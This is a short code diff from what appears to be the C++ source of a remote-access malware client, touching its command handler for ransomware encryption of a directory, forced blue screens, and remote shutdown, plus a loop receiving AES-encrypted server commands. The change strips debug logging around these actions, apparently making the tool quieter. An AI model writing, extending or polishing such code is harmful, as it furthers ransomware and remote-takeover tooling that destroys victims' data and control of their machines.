@@ -258,8 +258,6 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
         success = TRUE;
         break;
     case Action::kRansomwareEnable:
-        CLIENT_DBG("run ransomware in directory");
-        CLIENT_DBG(command.buffer);
         this->m_FileManager.TransformFiles(command.buffer, &FileManager::EncryptContents, this->m_FileManager);
         success = TRUE;
         break;
@@ -274,7 +272,6 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
         this->m_ProcMgr.BSOD();
         break;
     case Action::kRemoteShutdown: {
-        CLIENT_DBG(command.buffer);
         if ( strcmp(command.buffer, "shutdown") == 0 )
             ProcessManager::ShutdownSystem(ShutdownPowerOff);
         else if ( strcmp(command.buffer, "restart") == 0 )
@@ -334,8 +331,6 @@ void Client::ListenForServerCommands() {
             
             continue;
         }
-
-        CLIENT_DBG("received");
 
         Packet receivedPacket = LGCrypto::DecryptToStruct<Packet>(encrypted, this->m_AESKey);
         
